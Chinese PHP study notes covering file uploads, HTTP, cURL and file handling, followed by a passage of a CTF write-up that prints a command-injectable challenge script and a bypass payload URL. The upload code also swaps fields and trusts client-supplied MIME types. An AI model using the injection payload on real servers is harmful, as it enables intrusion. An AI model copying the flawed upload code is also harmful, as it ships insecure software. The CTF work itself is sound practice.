同名多文件上传：想办法得到一个文件对应的五个元素数组。从$_FILES中把对应的name\tmp_name\size\error\type挨个取出来，然后存放到不同的数组中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//同名文件遍历处理方式</span><br><span class="line">//此时遍历$_FILES没有意义，只有一个数组元素；应该变量$_FILES[&#x27;userfile&#x27;][&#x27;任意一个要素：name|tmp_name|size|error|type&#x27;]</span><br><span class="line">//判断元素存在而且是数组：name有代表是文件，name元素有多个（数组）代表是同名批量上传</span><br><span class="line">if(isset($_FILES[&#x27;image&#x27;][&#x27;name&#x27;]) &amp;&amp; is_array($_FILES[&#x27;image&#x27;][&#x27;name&#x27;]))&#123;</span><br><span class="line">//遍历构造数组元素</span><br><span class="line">$images = array();//存储所有的文件信息，一个元素代表一个文件（数组）</span><br><span class="line">foreach($_FILES[&#x27;image&#x27;][&#x27;name&#x27;] as $k =&gt; $file)&#123;</span><br><span class="line">$images[] = array(</span><br><span class="line">&#x27;name&#x27; =&gt; $file,</span><br><span class="line">&#x27;tmp_name&#x27; =&gt; $_FILES[&#x27;image&#x27;][&#x27;type&#x27;][$k],</span><br><span class="line">&#x27;type&#x27; =&gt; $_FILES[&#x27;image&#x27;][&#x27;tmp_name&#x27;][$k],</span><br><span class="line">&#x27;error&#x27; =&gt; $_FILES[&#x27;image&#x27;][&#x27;error&#x27;][$k],</span><br><span class="line">&#x27;size&#x27; =&gt; $_FILES[&#x27;image&#x27;][&#x27;size&#x27;][$k]</span><br><span class="line">);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>  需要上传的文件信息：对应的5个元素的数组</p><p>  ​    1、 文件类型是否合适？外部指定MIME类型</p><p>  ​    2、 文件存储到什么位置？外部指定</p><p>  ​    3、 文件格式限制（文件后缀）？外部限定</p><p>  ​    4、 文件大小限制？外部指定</p><p>  结果：实现文件上传</p><p>  ​    1、 成功：结果能够在以后看到：需要将文件的路径和文件名字返回（存储到数据库）</p><p>  ​    2、 失败：返回false，指定错误原因（引用参数）</p></blockquote><p>1）封装出一个上传函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 实现文件上传（单）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>1 array $file，需要上传的文件信息：一维5元素数组（name\tmp_name\error\size\type)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>2 array $allow_type，允许上传的MIME类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>3 string $path，存储的路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>4 string &amp;$error，如果出现错误的原因</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>5 array $allow_format = array()，允许上传的文件格式</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>6 int $max_size = 2000000，允许上传的最大值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_single</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$allow_type</span>,<span class="variable">$path</span>,&amp;<span class="variable">$error</span>,<span class="variable">$allow_format</span> = <span class="keyword">array</span>(<span class="params"></span>),<span class="variable">$max_size</span> = <span class="number">2000000</span></span>)</span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2）判断文件是否有效</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!is_array(<span class="variable">$file</span>) || !<span class="keyword">isset</span>(<span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>]))&#123;</span><br><span class="line"><span class="comment">//文件无效</span></span><br><span class="line"><span class="variable">$error</span> = <span class="string">&#x27;不是一个有效的上传文件！&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3）判断保存路径是否有效</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!is_dir(<span class="variable">$path</span>))&#123;</span><br><span class="line"><span class="comment">//路径不存在</span></span><br><span class="line"><span class="variable">$error</span> = <span class="string">&#x27;文件存储路径不存在！&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4）判断文件本身上传的过程中是否有错误：error</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(<span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>])&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="variable">$error</span> = <span class="string">&#x27;文件超出服务器允许大小！&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="variable">$error</span> = <span class="string">&#x27;文件上传过程中出现问题，只上传一部分！&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"><span class="variable">$error</span> = <span class="string">&#x27;用户没有选中要上传的文件！&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line"><span class="variable">$error</span> = <span class="string">&#x27;文件保存失败！&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5）文件类型的处理：通过MIME匹配即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!in_array(<span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line"><span class="comment">//该文件类型不允许上传</span></span><br><span class="line"><span class="variable">$error</span> = <span class="string">&#x27;当前文件类型不允许上传！&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>6）文件格式的处理：后缀名的问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断后缀是否允许</span></span><br><span class="line"><span class="comment">//取出后缀</span></span><br><span class="line"><span class="variable">$ext</span> = ltrim(strrchr(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>],<span class="string">&#x27;.&#x27;</span>),<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$allow_format</span>) &amp;&amp; !in_array(<span class="variable">$ext</span>,<span class="variable">$allow_format</span>))&#123;</span><br><span class="line"><span class="comment">//不允许上传</span></span><br><span class="line"><span class="variable">$error</span> = <span class="string">&#x27;当前文件的格式不允许上传！&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>7）文件大小的处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断当前文件大小是否满足当前需求</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="variable">$max_size</span>)&#123;</span><br><span class="line"><span class="comment">//文件过大</span></span><br><span class="line"><span class="variable">$error</span> = <span class="string">&#x27;当前上传的文件超出大小，最大允许&#x27;</span> . <span class="variable">$max_size</span> . <span class="string">&#x27;字节!&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>8）移动到指定目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//移动到指定目录</span></span><br><span class="line"><span class="keyword">if</span>(!is_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line"><span class="comment">//文件不是上传的</span></span><br><span class="line"><span class="variable">$error</span> = <span class="string">&#x27;错误：不是上传文件！&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>8）命名冲突的处理：上传同名文件？中文名字文件怎么办？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造文件名字：类型_年月日+随机字符串.$ext</span></span><br><span class="line"><span class="variable">$fullname</span> = strstr(<span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>],<span class="string">&#x27;/&#x27;</span>,<span class="literal">TRUE</span>) . date(<span class="string">&#x27;YYYYmmdd&#x27;</span>);</span><br><span class="line"><span class="comment">//产生随机字符串</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">4</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="variable">$fullname</span> .= chr(mt_rand(<span class="number">65</span>,<span class="number">90</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//拼凑后缀</span></span><br><span class="line"><span class="variable">$fullname</span> .= <span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//移动到指定目录</span></span><br><span class="line"><span class="keyword">if</span>(!is_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line"><span class="comment">//文件不是上传的</span></span><br><span class="line"><span class="variable">$error</span> = <span class="string">&#x27;错误：不是上传文件！&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$path</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$fullname</span>))&#123;</span><br><span class="line"><span class="comment">//成功</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$fullname</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//移动失败</span></span><br><span class="line"><span class="variable">$error</span> = <span class="string">&#x27;文件上传失败！&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第四天"><a href="#第四天" class="headerlink" title="第四天"></a>第四天</h1><p>HTTP协议</p><p>HTTP协议初步认识</p><p>HTTP协议概念</p><p>HTTP协议，即超文本传输协议(Hypertext transfer protocol)。是一种详细规定了浏览器和万维网(WWW = World Wide Web)服务器之间互相通信的规则，通过因特网传送万维网文档的数据传送协议。</p><p>HTTP协议是用于从WWW服务器传输超文本到本地浏览器的传送协议。它可以使浏览器更加高效，使网络传输减少。它不仅保证计算机正确快速地传输超文本文档，还确定传输文档中的哪一部分，以及哪部分内容首先显示(如文本先于图形)等。</p><p>HTTP协议特点</p><p>1） 客户/服务器模式：客户端（浏览器）/服务端</p><p>2） 简单快速：客户向服务器请求服务时，只需传送请求方法和路径。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。</p><p>3） 灵活：HTTP允许传输任意类型的数据对象（MIME类型）</p><p>4）无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。</p><p>5）无状态：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。</p><p>HTTP协议分类</p><p>1）http请求协议：浏览器向服务器发起请求的时候需要遵循的协议</p><p>2）http响应协议：服务器向浏览器发起响应的时候需要遵循的协议</p><p>请求行</p><p>1） 形式：请求方式 资源路径  协议版本号</p><p>2） GET /index.php HTTP/1.1</p><p>最早的时候HTTP协议有过1.0，请求行独占一行（第一行）</p><p>请求头</p><p>请求头就是各项协议内容：具体的协议内容不会每次都使用全部</p><p>1）Host：请求的主机地址（必须）</p><p>2）Accept：当前请求能够接收服务器返回的类型（MIME类型）</p><p>3）Accept-Language：接收的语言</p><p>4）User-Agent：客户浏览器所在点的一些信息</p><p>请求头不固定数量，每个请求协议也是独占一行，最后会有一行空行（用来区分请求头和请求体）</p><p>请求体</p><p>请求数据：POST请求会有请求体。GET请求所有的数据都是跟在URL之后，会在请求行中的资源路径上体现。</p><p>基本格式：资源名字=资源值&amp;资源名字=资源值…</p><p>​                               </p><p>HTTP响应</p><p>响应行</p><p>1）形式：协议版本号 状态码 状态消息（独占一行）</p><p>HTTP/1.1 200 ok</p><p>2）200 ok： 成功</p><p>3）403 Forbidden： 没权限访问</p><p>4）404 Not Found： 未找到页面</p><p>5）500 Server Internal Error： 服务器内部错误</p><p>响应头</p><p>具体协议内容</p><p>1）时间：Wed, 16 Sep 2017 11:43:33 GMT</p><p>2）服务器：Server: Apache/2.2.22 (Win32) PHP/5.3.13</p><p>3）内容长度：Content-Length: 1571，数据具体的字节数（响应体）</p><p>4）内容类型：Content-Type: text/html：告诉浏览器对应的数据格式</p><p>列举了几个常见的响应头，并不是全部：响应头一个占一行，最后一行空行（区分响应头和响应体）</p><p>响应体</p><p>实际服务器响应给浏览器的内容</p><p>常用HTTP状态码</p><p>状态码200：成功</p><p>状态码403：forbidden，拒绝访问（没有权限）</p><p>状态码404：NOT FOUND，找不到</p><p>状态码500：服务器问题</p><p>服务器正在处理过程中</p><p>服务器正常且正确处理</p><p>请求的目标已经转移或者需要更新</p><p>客户端出错了</p><p>服务器出错</p><p>HTTP响应</p><p>常见HTTP响应设置及使用</p><p>PHP中针对HTTP协议（响应）进行了底层设计，可以通过函数header来实现修改HTTP响应（响应头）</p><p>注意事项：</p><p>1、 Header可以设计HTTP响应，因为HTTP协议特点是：响应行，响应头（空行结尾），响应体。认为通过header设计响应头的时候，不应该有任何内容输出，所以一旦产生内容输出（哪怕一个空格），系统都会认为响应头已经结束而响应体开始了，所有如果先输出内容后设置响应头（header使用），理论设置无效；</p><p>2、 在PHP5以后，增加程序缓存内容：允许服务器脚本在输出内容的时候，不直接返回浏览器而是现在服务器端使用程序缓存保留（php.ini中使用output_buffering），有了该内容之后，在程序缓存内会自动调整响应头和响应体（允许响应头在已经输出的内容之后再设置），但是此时会报错（警告）。</p><p>总结：header设置响应体之前不要有任何输出</p><p>Location：重定向，立即跳转（响应体不用解析）</p><p>浏览器在解析服务器响应的时候：先判定响应行，继续响应头，最后响应体：location是在响应头中，所以浏览器一旦见到该协议项，不再向下解析。</p><p>Refresh：重定向，定时跳转（响应体会解析）</p><p>延时重定向：浏览器会根据具体时间延迟后在访问指定跳转链接：浏览器在准备跳转访问之前，会继续解析HTTP协议（响应头和响应体）</p><p>Content-type：内容类型，MIME类型</p><p>通过内容告知（MIME类型），浏览器正确解析内容</p><p>Content-disposition：内容类型，MIME类型扩展，激活浏览器文件下载对话框</p><p>浏览器在解析内容的时候，默认是直接解析：那么有时候需要浏览器不解析，当做内容下载成文件</p><h2 id="PHP模拟HTTP请求"><a href="#PHP模拟HTTP请求" class="headerlink" title="PHP模拟HTTP请求"></a>PHP模拟HTTP请求</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>PHP可以通过模拟HTTP协议发起HTTP请求</p><p>CURL是一个非常强大的开源库，支持很多协议，包括HTTP、FTP、TELNET等，我们使用它来发送HTTP请求。它给我 们带来的好处是可以通过灵活的选项设置不同的HTTP协议参数，并且支持HTTPS。CURL可以根据URL前缀是“HTTP” 还是“HTTPS”自动选择是否加密发送内容。</p><p>前提条件：HTTP协议的客户端/服务端模式，HTTP协议不局限于一定要浏览器访问</p><h3 id="Curl扩展库使用"><a href="#Curl扩展库使用" class="headerlink" title="Curl扩展库使用"></a>Curl扩展库使用</h3><p>1、 开启CURL扩展</p><p>2、 有的时候PHP版本会出现即使开启了扩展也无法使用扩展的可能：因为CURL找不到对应的dll文件：需要将相关的DLL文件放到C:windows</p><p>3、 重启Apache应用</p><p>1）建立连接：curl_init()：激活一个CURL连接功能</p><p>2）设置请求选项：curl_setOpt()：设定选项</p><p>CURLOPT_URL：连接对象</p><p>CURLOPT_RETURNTRANSFER:将服务器执行的结果（响应）以文件流的形式返回给请求界面（PHP脚本）</p><p>CURLOPT_POST：是否才有POST方式发起请求（默认请求是GET）</p><p>CURLOPT_POSTFIELDS：用来传递POST提交的数据，分为两种方式：字符串（name=abc&amp;password=123）以及数组形式（array(‘name’=&gt;’abc’,…)）</p><p>CURLOPT_HEADER：是否得到响应的header信息（响应头），默认不获取</p><p>3）执行请求：curl_exec()：执行选项（与服务器发起请求），得到服务器返回的内容</p><p>乱码原因：20select.php中的内容有告知浏览器，但是当前是被服务器脚本23curl_http.php访问的，没有做解析；输出给浏览器之后，需要当前23curl_http.php告知浏览器对应的字符集</p><p>4）关闭连接：curl_close()：关闭资源</p><p>文件编程</p><p>文件编程初步认识</p><p>文件编程的必要性</p><p>文件编程指利用PHP代码针对文件（文件夹）进行增删改查操作。</p><p>在实际开发项目中，会有很多内容（文件上传、配置文件等）具有很多不确定性，不能在一开始就手动的创建，需要根据实际需求和数据本身来进行管理，这个时候就可以使用PHP文件编程来实现代码批量控制和其他操作。</p><p>文件操作的分类</p><p>1） 目录操作：文件夹，用来存放文件的特殊文件</p><p>2） 文件操作：用来存放内容</p><p>目录操作</p><p>文件操作创建目录结构</p><p>1）mkDir(路径名字)：创建成功返回true，创建失败返回false</p><p>有些操作为的就是得到一个想要的结果，如果结果本身就存在，那么可以忽略得到过程的错误：抑制错误</p><p>删除目录</p><p>1）rmDir(指定文件夹路径)：移出文件夹</p><p>读取目录</p><p>读取方式：将文件夹（路径）按照资源方式打开</p><p>1）openDir()：打开资源，返回一个路径资源，包含指定目录下的所有文件（文件夹）</p><p>2）readDir()：从资源中读取指针所在位置的文件名字，然后指针下移，直到指针移出资源</p><p>读取所有内容：遍历操作</p><p>关闭目录</p><p>1）closeDir()：关闭资源</p><p>其他目录操作</p><p>1）dirName(一个路径)：得到的是路径的上一层路径</p><p>2）realPath(一个路径)：得到真实路径（目录路径），如果是文件那么得到的结果是false</p><p>3）is_dir()：判断指定路径是否是一个目录</p><p>4）scandir()：封装版的opendir\readdir\closedir，获取一个指定路径下的所有文件信息，以数组形式返回</p><p>目录操作</p><p>递归遍历目录</p><p>递归遍历目录：指定一个目录的情况下，将其下的所有文件和目录，及其目录内部的所有内容都输出出来。</p><p>递归算法：将大问题切成相似的小问题（最小单位），然后可以调用解决大问题的方法来解决小问题。</p><p>递归函数：函数如果自己内部调用自己，该函数称之为递归函数。</p><p>递归遍历目录的思维逻辑</p><p>1、 设计一个能够遍历一层文件的函数</p><p>a.  创建函数</p><p>b.  安全判定：是路径才访问</p><p>c.   读取全部内容，遍历输出</p><p>2、 找到递归点：遍历得到的文件是目录，应该调用当前函数（调用自己）：</p><p>a.  需要构造路径（遍历得到的结果只是文件的名字）</p><p>b.  需要注意排除.和..</p><p>c.   判断是路径还是文件</p><p>d.  递归调用函数</p><p>3、 找到递归出口：遍历完这个文件夹之后，发现没有任何子文件夹（函数不再调用自己）：自带递归出口</p><p>4、 如何显示层级关系？函数第一次运行遍历的结果是最外层目录，内部调用一次说明进入一个子目录，子目录再调用一次函数进行孙子目录…如果能够在第一次调用的时候给个标记，然后在进入的时候，通过标记的变化来识别层级关系，就可以达到目的：该标记还能代表层次关系：缩进</p><p>a.  在函数参数中增加一个标记：默认值为0</p><p>b.  递归调用函数的时候也需要使用该参数：但是是属于当前层级的子层，所以+1</p><p>c.   根据层级来实现缩进：str_repeat()</p><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><h3 id="PHP5常见文件操作函数"><a href="#PHP5常见文件操作函数" class="headerlink" title="PHP5常见文件操作函数"></a>PHP5常见文件操作函数</h3><p>1）file_get_contents(文件路径)：获取指定文件的所有内容，如果路径不存在最好做安全处理</p><p>2）file_put_contents(文件路径，内容)：将指定内容写入到指定文件内：如果当前路径下不存在指定的文件，函数会自动创建（如果路径不存在，不会创建路径）</p><h3 id="PHP4常见文件操作函数"><a href="#PHP4常见文件操作函数" class="headerlink" title="PHP4常见文件操作函数"></a>PHP4常见文件操作函数</h3><p>PHP4中是将文件操作用资源形式处理：不论是读还是写都依赖资源指针：文件内容中指针所在位置。</p><p>1）fopen(文件路径，打开模式)：打开一个文件资源，限定打开模式</p><p>2）fread(资源，长度)：从打开的资源中读取指定长度的内容（字节）</p><p>3）fwrite(资源，内容)：向打开的资源中写入指定的内容</p><p>4）fclose(资源)：关闭资源</p><h3 id="其他文件操作函数"><a href="#其他文件操作函数" class="headerlink" title="其他文件操作函数"></a>其他文件操作函数</h3><p>1）is_file()：判断文件是否正确（不识别路径）</p><p>2）filesize()：获取文件大小</p><p>3）file_exists()：判断文件是否存在（识别路径）</p><p>4）unLink()：取消文件名字与磁盘地址的连接（删除文件）</p><p>5）filemtime()：获取文件最后一次修改的时间</p><p>6）fseek()：设定fopen打开的文件的指针位置</p><p>7）fgetc()：一次获取一个字符</p><p>8）fgets()：一次获取一个字符串（默认行）</p><p>9）file()：读取整个文件，类似file_get_contents，区别是按行读取，返回一个数组</p><h2 id="文件操作-1"><a href="#文件操作-1" class="headerlink" title="文件操作"></a>文件操作</h2><h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><p>文件下载：从服务器将文件通过HTTP协议传输到浏览器，浏览器不解析保存成相应的文件。</p><p>提供下载方式可以使用HTML中的a标签：<a href="互联网绝对文件路径">点击下载</a></p><p>1、 缺点1：a标签能够让浏览器自动下载的内容有限：浏览器是发现如果解析不了才会启用下载</p><p>2、 缺点2：a标签下载的文件存储路径会需要通过href属性写出来，这样会暴露服务器存储数据的位置（不安全）</p><p>PHP下载：读取文件内容，以文件流的形式传递给浏览器：在响应头中告知浏览器不要解析，激活下载框实现下载。</p><p>1） 指定浏览器解析字符集</p><p>2） 设定响应头</p><p>a)  设定文件返回类型：image/jpg||application/octem-stream</p><p>b)  设定返回文件计算方式：Accept-ranges：bytes</p><p>c)  设定下载提示：Content-disposition:attachment;filename=’文件名字’</p><p>d)  设定文件大小：Accept-length：文件大小（字节）</p><p>3） 读取文件</p><p>4） 输出文件</p><p>方案1：如果文件较小，可以使用PHP5的文件函数操作：file_get_contents</p><p>方案2：文件比较大（网络不好），可以使用PHP4 的文件操作方式：一次读一点</p><p> [WUSTCTF2020]朴实无华</p><p>看一看 扫一扫</p><p>…..</p><!--more--><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824164630868.png" alt="image-20210824164630868"></p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824164717241.png" alt="image-20210824164717241"></p><p>编码是unicode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#x27;Content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//level 1</span><br><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;</span><br><span class="line">        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;金钱解决不了穷人的本质问题&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">//level 2</span><br><span class="line">if (isset($_GET[&#x27;md5&#x27;]))&#123;</span><br><span class="line">   $md5=$_GET[&#x27;md5&#x27;];</span><br><span class="line">   if ($md5==md5($md5))</span><br><span class="line">       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;</span><br><span class="line">   else</span><br><span class="line">       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//get flag</span><br><span class="line">if (isset($_GET[&#x27;get_flag&#x27;]))&#123;</span><br><span class="line">    $get_flag = $_GET[&#x27;get_flag&#x27;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);</span><br><span class="line">        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;快到非洲了&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>intval 5e10返回</p><blockquote><p>当科学计数法为字符串传入到<code>intval</code>函数中时，它将会只返回<code>e</code>前面的整数<br>如果该字符串加上1，又能够变成数字型</p></blockquote><p>md5=0e215962017</p><blockquote><p>php弱等于 0e开头后面纯数字的字符串都相等 0e开头后接数字字符串md5后还是0e开头后接数字</p></blockquote><p>先看看有啥文件 再绕过cat和空格</p><p><code>?num=5e10&amp;md5=0e215962017&amp;get_flag=ls</code></p><p> <img src="E:/sECRET/hexo/blog/source/_posts/image-20210824165715078.png" alt="image-20210824165715078"></p><p>血 吗长的文件  打开 